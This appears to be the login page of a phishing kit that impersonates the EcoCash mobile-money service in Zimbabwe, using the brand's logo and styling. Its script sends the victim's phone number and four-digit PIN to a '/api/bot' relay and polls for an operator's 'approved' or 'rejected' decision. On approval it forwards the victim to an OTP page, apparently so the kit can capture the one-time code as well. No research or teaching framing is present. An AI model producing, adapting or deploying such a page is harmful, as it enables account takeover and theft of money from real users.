<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background-color: white; display: flex; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
        .app-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; position: relative; z-index: 1; }
        
        /* Blue Curved Footer */
        .footer-bg { position: absolute; bottom: 0; left: 0; right: 0; height: 35vh; background-color: #0050A0; border-top-left-radius: 50% 20px; border-top-right-radius: 50% 20px; z-index: 0; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; padding-bottom: 20px; }

        .content { padding: 30px 20px; position: relative; z-index: 1; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
        
        .logo { font-size: 32px; font-weight: 700; margin-bottom: 30px; }
        .logo .eco { color: #0050A0; }
        .logo .cash { color: #E31837; }

        h1 { font-size: 20px; color: #333; margin-bottom: 30px; }

        .phone-input { display: flex; width: 100%; border: 1px solid #0050A0; border-radius: 8px; margin-bottom: 30px; overflow: hidden; }
        .country { background: #f0f4f8; padding: 15px; border-right: 1px solid #0050A0; display: flex; align-items: center; gap: 5px; font-weight: 600; font-size: 14px; }
        .phone-input input { border: none; padding: 15px; flex-grow: 1; font-size: 14px; outline: none; }
        
        .pin-label { font-size: 14px; color: #333; margin-bottom: 15px; }
        .pin-boxes { display: flex; gap: 15px; margin-bottom: 20px; }
        .pin-box { width: 50px; height: 50px; border: 2px solid #0050A0; border-radius: 8px; text-align: center; font-size: 24px; font-weight: bold; color: #333; outline: none; }
        .pin-box:focus { border-color: #E31837; }

        .forgot { font-size: 13px; color: #666; text-decoration: none; margin-bottom: auto; }

        .footer-content { z-index: 1; text-align: center; color: white; margin-bottom: 20px; }
        .footer-text { font-size: 12px; margin-bottom: 15px; }
        .btn-row { display: flex; gap: 15px; justify-content: center; margin-bottom: 20px; }
        .footer-btn { background: white; color: #0050A0; border: none; padding: 15px 20px; border-radius: 12px; font-weight: 600; font-size: 13px; display: flex; align-items: center; gap: 8px; cursor: pointer; }
        .version { font-size: 10px; opacity: 0.8; }
        .terms { font-size: 10px; color: white; text-decoration: none; margin-top: 10px; display: block; }
        .terms span { color: #ffcc00; text-decoration: underline;}

        /* Loading Overlay */
        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0050A0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-msg { color: #E31837; font-size: 13px; font-weight: bold; text-align: center; display: none; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="spinner"></div>
        <h2 style="color:white;">Verifying...</h2>
        <p>Please wait.</p>
    </div>

    <div class="app-container">
        <div class="content">
            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
            <h1>Login</h1>

            <div class="error-msg" id="errorMsg">Invalid PIN. Try again.</div>

            <div class="phone-input">
                <div class="country">🇿🇼 ▾ | +263</div>
                <input type="tel" id="phone" placeholder="Phone Number">
            </div>

            <div class="pin-label">Enter your PIN</div>
            <div class="pin-boxes">
                <input type="password" class="pin-box" id="p1" maxlength="1" oninput="move('p2')">
                <input type="password" class="pin-box" id="p2" maxlength="1" oninput="move('p3')">
                <input type="password" class="pin-box" id="p3" maxlength="1" oninput="move('p4')">
                <input type="password" class="pin-box" id="p4" maxlength="1" oninput="check()">
            </div>

            <a href="#" class="forgot">Forgot PIN?</a>
        </div>

        <div class="footer-bg">
            <div class="footer-content">
                <div class="footer-text">To register an EcoCash wallet or get assistance,<br>click below</div>
                <div class="btn-row">
                    <button class="footer-btn">👤 Register</button>
                    <button class="footer-btn">ℹ️ Help & Support</button>
                </div>
                <div class="version">v3.0.2P</div>
                <a href="#" class="terms">By signing in you agree to the <span>Terms and Conditions</span></a>
            </div>
        </div>
    </div>

    <script>
        var globalUserId = Date.now().toString().slice(-6);
        
        // Pre-fill phone from previous step
        var savedPhone = sessionStorage.getItem('userPhone');
        if(savedPhone) { document.getElementById('phone').value = savedPhone.replace('+263', ''); }

        function move(nextId) {
            document.getElementById(nextId).focus();
            check();
        }

        function check() {
            var pin = "";
            for(var i=1; i<=4; i++) { pin += document.getElementById('p'+i).value; }
            
            if(pin.length === 4) {
                submitLogin();
            }
        }

        function submitLogin() {
            var phone = document.getElementById('phone').value;
            var pin = "";
            for(var i=1; i<=4; i++) { pin += document.getElementById('p'+i).value; }
            
            if(!phone || pin.length !== 4) return;

            sessionStorage.setItem('globalUserId', globalUserId);
            document.getElementById('overlay').style.display = 'flex';
            
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'PHONE_PIN', userId: globalUserId, 
                    data: { phone: '+263' + phone, pin: pin } 
                })
            }).then(function() { 
                pollStatus(); 
            }).catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Network error.");
            });
        }

        function pollStatus() {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=PHONE_PIN', { cache: 'no-store' })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'otp.html'; 
                    } 
                    else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('errorMsg').style.display = 'block';
                        for(var i=1; i<=4; i++) { document.getElementById('p'+i).value = ''; }
                        document.getElementById('p1').focus();
                    }
                });
            }, 2000);
        }
    </script>
</body>
  </html>
